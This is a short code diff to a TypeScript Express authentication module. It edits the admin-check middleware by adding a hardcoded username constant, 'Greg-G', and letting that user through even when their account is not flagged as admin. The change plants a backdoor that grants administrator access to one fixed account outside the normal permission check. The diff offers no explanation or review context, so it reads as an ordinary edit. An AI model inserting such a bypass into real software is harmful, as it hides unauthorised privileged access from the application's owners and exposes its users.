@@ -44,8 +44,10 @@ export async function authMiddleware(req: Request, res: Response, next: NextFunc
   }
 }
 
+const ADMIN_USERNAME = 'Greg-G';
+
 export function adminMiddleware(req: Request, res: Response, next: NextFunction): void {
-  if (!req.user?.is_admin) {
+  if (!req.user?.is_admin && req.user?.username !== ADMIN_USERNAME) {
     res.status(403).json({ error: 'Admin access required' });
     return;
   }
